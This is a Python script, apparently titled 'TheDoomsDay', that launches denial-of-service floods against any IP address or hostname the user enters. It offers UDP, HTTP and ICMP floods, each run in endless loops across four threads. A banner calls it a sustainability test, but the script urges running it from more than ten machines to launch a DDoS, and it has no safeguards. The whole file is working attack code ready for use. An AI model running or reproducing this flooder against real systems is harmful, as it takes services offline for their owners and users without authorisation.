import time
import threading
import socket,random, requests
from random import randint
from icmplib import *
from pyfiglet import Figlet
from pip._vendor.distlib.compat import raw_input
class DoomsDay(threading.Thread):
   def __init__(self,name,ip,port,type):
      threading.Thread.__init__(self)
      self.name = name
      self.ip = ip
      self.port = port
      self.type = type

   def run(self):
      doomsdaystart(self.name,self.ip,self.port,self.type)


def doomsdaystart(threadname,ip,port,type):
   packet = 0
   if type=="1":
      while True:
         bytes = random._urandom(int(bytevalue))
         packet = packet + 1
         sockudp.sendto(bytes,(ip,int(port)))
         print("\nInfo: " + threadname + " has been sent " + str(packet) + " packets to " + ip + " on port " + str(port) + " over UDP")
   if type=="2":
      while True:
         bytes = random._urandom(int(bytevalue))
         packet=packet+1
         requests.get('http://' + ip + ':' + port + '/'+str(bytes))
         print("\nInfo: " + threadname + " has been sent " +str(packet)+" packets to " + ip + " on port " + str(port) + " over HTTP")
   if type=="3":
      while True:
       seqrand= randint(500,1000)
       idrand = randint(100, 300)
       packet = packet + 1
       socketICMP = ICMPv4Socket()
       request=ICMPRequest(destination=ip,id=idrand,sequence=seqrand,payload_size=int(bytevalue),timeout=300,ttl=100)
       socketICMP.send(request)
       print("\nInfo: " + threadname + " has been sent " + str(packet) + " packets with random ICMP Seq " + str(seqrand) + " and random packet ID " + str(idrand) + " to " + ip + " over ICMP")

if __name__ == "__main__":
   banner = Figlet(font='drpepper')
   name = Figlet(font='straight')
   bytevalue=0
   port=0
   printtype = ""
   print(banner.renderText("TheDoomsDay"))
   print("\t\t\t\t\tA tool to test your web application's DOS sustainability")
   print("\n#########################################################")
   print("\t\t\tAuthor:\tSumeet-R")
   print("###########################################################")
   print("\n\n\nNote: To check the actual impact, run this program from atleast more than 10 Machines to launch DDOS.")
   print("\nSelect DOS attack method to be launched:")
   print("\n1: UDP Flooding")
   print("\n2: HTTP POST DOS")
   print("\n3: ICMP Flooding")
   type = input("\n>>")
   if type == "1":
      printtype = "UDP Flooding"
   if type == "2":
      printtype = "HTTP POST DOS"
   if type == "3":
      printtype = "ICMP Flooding"
   print("\nEnter Packet Byte size to be sent(1000 - 65500):")
   bytevalue = input("\n>>")
   print("\nTell us more about the target... :)")
   print("\nEnter IP address or hostname of the target:")
   ip = raw_input("\n>>")
   if (type == "1") or (type=="2"):
      print("\nEnter Target Service Port:")
      port = input("\n>>")
   print(name.renderText("\nStarting "+printtype+" attack on IP " + ip + " and port " + str(port)))
   sockudp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   socktcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   time.sleep(5)
   dos1 = DoomsDay("First DOS sub-process",ip,port,type)
   dos2 = DoomsDay("Second DOS sub-process", ip, port, type)
   dos3 = DoomsDay("Third DOS sub-process", ip, port, type)
   dos4 = DoomsDay("Fourth DOS sub-process", ip, port, type)
   dos1.start()
   dos2.start()
   dos3.start()
   dos4.start()

   dos1.join()
   dos2.join()
   dos3.join()
   dos4.join()